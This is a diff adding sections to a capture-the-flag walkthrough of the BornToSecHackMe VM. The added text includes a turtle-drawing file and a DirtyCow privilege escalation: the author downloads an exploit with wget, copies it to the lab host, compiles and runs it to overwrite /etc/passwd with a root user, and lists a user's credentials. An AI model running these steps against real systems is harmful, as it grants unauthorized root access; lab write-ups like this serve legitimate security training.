@@ -1046,6 +1046,18 @@ drwx------ 2 thor     thor    43 Oct 15  2015 .cache
 -rwxr-x--- 1 thor     thor 31523 Oct  8  2015 turtle
 thor@BornToSecHackMe:~$ cat README
 Finish this challenge and use the result as password for 'zaz' user.
+thor@BornToSecHackMe:~$ cat turtle
+Tourne gauche de 90 degrees
+Avance 50 spaces
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+Tourne gauche de 1 degrees
+<SNIP>
 thor@BornToSecHackMe:~$
 ```
 ### The Turtle
@@ -1642,4 +1654,61 @@ raptor_udf2.so                                                                  
 
 ┌──(fab㉿kali)-[~]
 └─$
+```
+
+### The First Alternative: DirtyCow
+
+As laurie, with the credentials:
+```
+laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+```
+we can launch LinPEAS:
+
+```
+┌──(fab㉿kali)-[~]
+└─$ wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
+
+┌──(fab㉿kali)-[~]
+└─$ scp dirty.c laurie@192.168.56.101:~
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+laurie@192.168.56.101's password:
+dirty.c                                                                               100% 4815     1.4MB/s   00:00
+
+┌──(fab㉿kali)-[~]
+└─$
+```
+And in the remote system:
+```
+laurie@BornToSecHackMe:~$ ls
+bomb  dirty.c  README
+laurie@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
+laurie@BornToSecHackMe:~$ ls
+bomb  dirty  dirty.c  README
+laurie@BornToSecHackMe:~$ chmod +x dirty
+laurie@BornToSecHackMe:~$ ./dirty swag
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: swag
+Complete line:
+firefart:fii3KM0hiSg7s:0:0:pwned:/root:/bin/bash
+
+mmap: b7fda000
+^C
+laurie@BornToSecHackMe:~$ su firefart
+Password:
+firefart@BornToSecHackMe:/home/laurie# whoami
+firefart
+firefart@BornToSecHackMe:/home/laurie# cd /root
+firefart@BornToSecHackMe:~# ls
+README
+firefart@BornToSecHackMe:~# cat README
+CONGRATULATIONS !!!!
+To be continued...
+firefart@BornToSecHackMe:~#
 ```
